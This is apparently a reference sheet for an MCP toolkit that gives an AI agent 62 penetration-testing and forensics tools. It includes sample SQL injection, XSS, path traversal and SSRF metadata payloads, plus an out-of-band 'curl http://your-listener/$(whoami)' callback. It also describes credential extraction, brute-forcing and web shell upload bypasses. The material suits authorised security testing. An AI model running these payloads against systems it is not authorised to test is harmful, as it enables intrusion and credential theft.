# Operant MCP — Pentesting Toolkit (62 Tools)

**Source:** [github.com/operantlabs/operant-mcp](https://github.com/operantlabs/operant-mcp)  
**Installed:** `npm install -g operant-mcp` → `hermes mcp add operant --command operant-mcp`  
**Available in Hermes after:** `/reset`  
**Tools count:** 62 (+ 8 methodology prompts)

---

## Quick Reference

| Category | Tools | When to Use |
|----------|-------|-------------|
| SQL Injection | 6 | Web apps with DB backends |
| XSS | 2 | User-facing input fields |
| Command Injection | 2 | Shell-execution params |
| Path Traversal | 1 | File-read parameters |
| SSRF | 2 | Server-side URL fetchers |
| PCAP / Network Forensics | 8 | Packet capture analysis |
| Reconnaissance | 7 | Target enumeration |
| Memory Forensics | 3 | Memory dump analysis |
| Malware Analysis | 2 | Suspicious documents |
| Cloud Security | 2 | AWS CloudTrail audit |
| Authentication | 3 | Auth logic testing |
| Access Control | 2 | IDOR / privilege escalation |
| Business Logic | 2 | Price / coupon abuse |
| Clickjacking | 2 | UI redress attacks |
| CORS | 1 | Cross-origin misconfigs |
| File Upload | 1 | Web shell uploads |
| NoSQL Injection | 2 | MongoDB-based apps |
| Deserialization | 1 | Insecure deserialization |
| GraphQL | 2 | API introspection |
| OOB / Exfiltration | 3 | Out-of-band interactions |
| Raw HTTP | 3 | Low-level HTTP attacks |
| Race Conditions | 2 | HTTP/2 race attacks |
| External Tooling | 3 | nuclei, ffuf, arjun |

---

## SQL Injection (6)

### `sqli_where_bypass`
Tests WHERE clause bypass via `OR 1=1` and variants. Sends multiple payloads targeting authentication and data-filtering bypasses. Returns which payloads succeeded.

> Use on: login forms, search params, API filters  
> Payloads: `' OR 1=1--`, `' OR '1'='1`, etc.

### `sqli_login_bypass`
Login-form specific SQLi via comment truncation (`administrator'--`). Tests username and password field injection separately.

### `sqli_union_extract`
Step-by-step UNION-based data extraction:
1. Finds column count via `ORDER BY` / `UNION SELECT NULL`
2. Identifies string-compatible columns
3. Extracts table names from `information_schema`
4. Extracts column names and data

### `sqli_blind_boolean`
Boolean-based blind SQLi using binary search for character enumeration. Sends conditions that evaluate true/false and infers data from response differences. Slower but works when no visible output is returned.

### `sqli_blind_time`
Time-based blind SQLi for MySQL, PostgreSQL, and MSSQL. Uses `SLEEP()` / `pg_sleep()` / `WAITFOR DELAY` to infer data from response timing. Works when no visible difference exists between true/false responses.

### `sqli_file_read`
Read server files via `UNION SELECT LOAD_FILE()`. MySQL-only. Useful for reading config files, source code, or credentials from the DB server.

---

## XSS (2)

### `xss_reflected_test`
Tests reflected XSS with 10 payloads against a parameter. Payloads include:
- `<script>alert(1)</script>`
- `<img src=x onerror=alert(1)>`
- `"><script>alert(1)</script>`
- `javascript:alert(1)`
- HTML entity and polyglot payloads

### `xss_payload_generate`
Generates context-appropriate XSS payloads. Pass context (`html`, `attribute`, `js`, `url`) and optional filter patterns to bypass.

---

## Command Injection (2)

### `cmdi_test`
Tests command injection using shell operators (`;`, `&&`, `||`, `` ` ``, `$(...)`). Sends payloads with timing-based verification. Returns which operators work.

### `cmdi_blind_detect`
Detects blind command injection via:
- **Time delay:** `sleep 5`, `ping -c 5 127.0.0.1`
- **OOB callback:** `curl http://your-listener/$(whoami)`

---

## Path Traversal (1)

### `path_traversal_test`
Tests directory traversal with encoding variants at multiple depths:
- `../../../etc/passwd`
- `....//....//....//etc/passwd`
- URL-encoded (`%2e%2e%2f`)
- Double-encoded (`%252e%252e%252f`)
- `..;/` (Tomcat bypass)

---

## SSRF (2)

### `ssrf_test`
Tests SSRF with 10+ localhost bypass variants:
- `http://127.0.0.1:80`, `http://localhost`
- `http://[::1]`, `http://0.0.0.0`
- Octal (`http://0177.0.0.1`), decimal (`http://2130706433`)
- DNS rebinding-style domains

### `ssrf_cloud_metadata`
Tests SSRF access to cloud metadata endpoints:
- **AWS:** `http://169.254.169.254/latest/meta-data/`
- **GCP:** `http://metadata.google.internal/`
- **Azure:** `http://169.254.169.254/metadata/instance`

---

## PCAP / Network Forensics (8)

### `pcap_overview`
Generates protocol hierarchy and endpoint statistics from a PCAP file. Returns protocol breakdown, top talkers, packet/size distribution.

### `pcap_extract_credentials`
Extracts credentials from captured traffic: FTP `USER`/`PASS`, HTTP Basic auth, SMTP `AUTH LOGIN`.

### `pcap_dns_analysis`
Extracts and analyzes DNS queries — unique domains, query types, tunneling indicators (high entropy subdomains, excessive NXDOMAIN).

### `pcap_http_objects`
Exports HTTP objects (files, images, scripts) from a PCAP to a directory.

### `pcap_detect_scan`
Detects port scanning via SYN packets without ACK. Returns scanner IPs, targets, and scan type.

### `pcap_follow_stream`
Reconstructs a full TCP/UDP/HTTP stream conversation. Useful for extracting payloads.

### `pcap_tls_analysis`
Analyzes TLS handshakes, SNI hostnames, certificate issuers and expiry.

### `pcap_llmnr_ntlm`
Detects LLMNR poisoning and extracts NTLM challenge/response pairs from SMB traffic. Indicators of Responder-style attacks.

---

## Reconnaissance (7)

### `recon_quick`
Quick recon: `robots.txt`, `security.txt`, `/.well-known/`, response headers, common dirs, tech fingerprinting.

### `recon_dns`
Full DNS enumeration: A, AAAA, MX, TXT, NS, CNAME, SOA, AXFR zone transfer, subdomain brute-force, SPF/DMARC policy.

### `recon_vhost`
Brute-forces virtual hosts via `Host` header fuzzing. Finds staging servers and hidden endpoints.

### `recon_tls_sans`
Extracts Subject Alternative Names from the TLS certificate. Reveals related domains, staging, and CDN endpoints.

### `recon_directory_bruteforce`
Parallel curl directory brute-force. Reports 200/403/301 responses.

### `recon_git_secrets`
Searches git history for secrets — commit messages with passwords/keys, deleted files, author info.

### `recon_s3_bucket`
Tests S3 bucket for public listing, file read, and write permissions.

---

## Memory Forensics (3)

### `volatility_linux`
Runs Volatility 2 Linux plugins: `linux_pslist`, `linux_psaux`, `linux_netstat`, `linux_bash`, `linux_malfind`.

### `volatility_windows`
Runs Volatility 3 Windows plugins: `windows.pslist.PsList`, `windows.netscan.NetScan`, `windows.cmdline.CmdLine`, `windows.handles.Handles`, `windows.malfind.Malfind`.

### `memory_detect_rootkit`
Linux rootkit detection — syscall table tampering, hidden kernel modules, processes hidden from `/proc/`.

---

## Malware Analysis (2)

### `maldoc_analyze`
Full OLE document analysis: `oledump.py` stream listing, auto-extraction, `olevba` macro analysis, deobfuscation markers.

### `maldoc_extract_macros`
Extracts raw VBA macros from OLE documents for manual analysis.

---

## Cloud Security (2)

### `cloudtrail_analyze`
Parses AWS CloudTrail logs — event timeline, geographic distribution, IAM activity, root activity detection.

### `cloudtrail_find_anomalies`
Finds anomalies: non-AWS IPs, unusual API calls, off-hours activity, access denied spikes.

---

## Authentication (3)

### `auth_csrf_extract`
Extracts CSRF tokens from HTML forms. Tests for predictable patterns.

### `auth_bruteforce`
Username enumeration (timing/error differences) + credential brute-force with rate-limit detection.

### `auth_cookie_tamper`
Tests cookie manipulation: session cookies, `admin=0→1`, Base64/JWT decode, `role`/`user_type` parameter escalation.

---

## Access Control (2)

### `idor_test`
Iterates sequential IDs to test for Insecure Direct Object References.

### `role_escalation_test`
Tests role-based access: user→admin, user→moderator parameter modifications.

---

## Business Logic (2)

### `price_manipulation_test`
Tests client-side `price`/`amount`/`quantity` parameter manipulation. Negative, zero, and decimal values.

### `coupon_abuse_test`
Tests coupon stacking, reuse, and alternation bypass.

---

## Clickjacking (2)

### `clickjacking_test`
Checks `X-Frame-Options` and `CSP frame-ancestors` headers. Generates PoC HTML.

### `frame_buster_bypass`
Tests sandbox attribute bypass to render target in an iframe.

---

## CORS (1)

### `cors_test`
Tests origin reflection, null origin, wildcard with credentials, trusted subdomain bypass.

---

## File Upload (1)

### `file_upload_test`
Tests content-type bypass, double extension, null byte injection, magic byte prepending for web shells.

---

## NoSQL Injection (2)

### `nosqli_auth_bypass`
Tests MongoDB `$ne`, `$gt`, `$regex` operator injection for auth bypass.

### `nosqli_detect`
Detects NoSQL injection in query parameters for MongoDB-based apps.

---

## Deserialization (1)

### `deserialization_test`
Detects PHP, Java (`aced0005`), Python pickle, and Ruby marshaling serialized objects. Tests attribute modification.

---

## GraphQL (2)

### `graphql_introspect`
Full schema introspection — all types, fields, queries, mutations.

### `graphql_find_hidden`
Field fuzzing to find undocumented/hidden fields not exposed via introspection.

---

## OOB / Exfiltration (3)

### `oob_start_listener`
Starts an interactsh-client listener in the background. Returns callback URL.

### `oob_poll_interactions`
Polls the listener for new OOB interactions — timestamp, source IP, protocol (HTTP/DNS), request details.

### `oob_generate_payload`
Generates category-specific OOB payloads (DNS, HTTP, ping) using the active listener.

---

## Raw HTTP (3)

### `raw_http_send`
Sends raw bytes over a TLS socket. Bypasses HTTP libs for smuggling, HTTP/0.9, malformed requests.

### `raw_h2_smuggle`
HTTP/2 request smuggling via header validation edge cases: `:authority`/`host` mismatch, pseudo-header ordering, connection-specific header injection.

### `raw_connection_reuse`
Multiple raw HTTP requests on a single TLS connection. CL.TE / TE.CL smuggling, connection pool poisoning.

---

## Race Conditions (2)

### `race_single_packet`
HTTP/2 single-packet race condition. Multiplexes N concurrent requests in one TCP packet. Targets: coupon, like, transfer, voting.

### `race_last_byte_sync`
Last-byte synchronization race. Sends headers immediately, delays final byte. All requests hit the server simultaneously.

---

## External Tooling (3)

### `nuclei_scan`
Runs [nuclei](https://github.com/projectdiscovery/nuclei) vulnerability scanner. Supports severity filtering, template selection, rate limiting.

### `ffuf_fuzz`
Directory and parameter fuzzing with [ffuf](https://github.com/ffuf/ffuf). Wordlist selection, recursion, size/status filters.

### `param_discover`
Discovers hidden parameters via [arjun](https://github.com/s0md3v/arjun). Infers parameters from response differences.

---

## Prompts (8)

Methodology guides invocable as MCP prompts:

| Prompt | Purpose |
|--------|---------|
| `web_app_pentest` | Full web app pentest methodology |
| `pcap_forensics` | PCAP analysis workflow |
| `memory_forensics` | Memory dump analysis (Linux/Windows) |
| `recon_methodology` | Reconnaissance checklist |
| `malware_analysis` | Malware document analysis |
| `cloud_security_audit` | CloudTrail analysis workflow |
| `sqli_methodology` | SQL injection testing guide |
| `xss_methodology` | XSS testing guide |

---

## Usage in Hermes

Tools are available as native Hermes tools after `/reset`. Call them directly:

> **You:** "Run quick recon on example.com"  
> → Hermes calls `recon_quick(target="https://example.com")`

> **You:** "Check if that login form is SQL injectable"  
> → Hermes calls `sqli_login_bypass(url="...", username_field="user", password_field="pass")`

> **You:** "Analyze this PCAP for credentials"  
> → Hermes calls `pcap_extract_credentials(pcap_path="/path/to/capture.pcap")`

> **You:** "Scan example.com with nuclei for critical vulns"  
> → Hermes calls `nuclei_scan(target="https://example.com", severity="critical,high")`

---

## System Requirements

| Dependency | Needed For | Status |
|------------|-----------|--------|
| `curl` | Most tools | ✅ Installed |
| `tshark` | PCAP analysis | ⬜ Check |
| `dig` / `host` (dnsutils) | DNS recon | ✅ Installed |
| `volatility` / `vol3` | Memory forensics | ⬜ Check |
| `olevba` / `oledump.py` | Malware analysis | ⬜ Check |
| `jq` | Cloud analysis | ✅ Installed |
| `nuclei` | External scans | ⬜ Check |
| `ffuf` | Fuzzing | ⬜ Check |
| `arjun` | Param discovery | ⬜ Check |
| `git` | Secret scanning | ✅ Installed |

---

## Notes

- All tools run on the **server** via MCP (not the laptop)
- PCAP files need to be on the server filesystem
- Memory forensics requires Volatility to be installed separately
- OOB tools use built-in interactsh
- External tools (`nuclei`, `ffuf`, `arjun`) need separate installation

---

*Generated 2026-07-05 | Version 2026.6.1 (62 tools)*
